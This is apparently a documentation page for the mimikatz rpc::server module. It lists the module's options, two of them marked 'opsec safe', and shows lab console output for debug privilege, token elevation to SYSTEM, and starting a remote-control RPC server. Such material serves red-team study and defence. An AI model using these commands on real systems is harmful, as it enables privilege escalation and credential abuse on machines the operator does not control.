# server

This module can be used to start an RPC server. It has the following command line arguments:

* `/stop`: terminates the RPC connection
* `/guid`: the guid for the RPC endpoint \(opsec safe\)
* `/noreg`: to not register the RPC binding
* `/secure`: only secure connections are accepted
* `/altservice`: alter the rpc service name \(opsec safe\)
* `/negotiate`: the default authentication mechanism `GSS_NEGOTIATE (9)`.
* `/ntlm:` use NTLM authentication `WINNT (10)`.
* `/kerberos`: use Kerberos authentication `GSS_KERBEROS (16)`.
* `/authuser`: the user for authentication
* `/authdomain`: the domain of the authuser
* `/authpassword`: the authuser's password

```text
mimikatz # privilege::debug
Privilege '20' OK
```

```text
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

752     {0;000003e7} 0 D 44299          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -> Impersonated !
 * Process Token : {0;002cfce0} 4 F 118309013   hacklab\m3g9tr0n        S-1-5-21-2725560159-1428537199-2260736313-1730  (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 0 D 118617400   NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)
```

{% tabs %}
{% tab title="Without authentication" %}
An RPC server can be started without an authentication requirement.

```text
mimikatz # rpc::server
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] Endpoint : (null)
[rpc] Service  : (null)
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Map Reg.: yes
Security: Allow no auth

mimikatz #  > BindString[0]: ncacn_ip_tcp:DC[61057]
 > RPC bind registered
 > RPC Server is waiting!
```
{% endtab %}

{% tab title="With authentication" %}
An RPC server can be started with an authentication requirement.

```text
mimikatz # rpc::server /secure /authuser:m3g9tr0n /authdomain:hacklab.local /authpassword:Super_SecretPass!
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] Endpoint : (null)
[rpc] Service  : (null)
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
Map Reg.: yes
Security: Secure only

mimikatz #  > BindString[0]: ncacn_ip_tcp:DC[61057]
 > RPC bind registered
 > RPC Server is waiting!

mimikatz # ** Security Callback! **
 > ServerPrincName:
 > AuthnLevel     :  6 - PKT_PRIVACY
 > AuthnSvc       : 10 - WINNT
 > AuthzSvc       :  0
```
{% endtab %}
{% endtabs %}

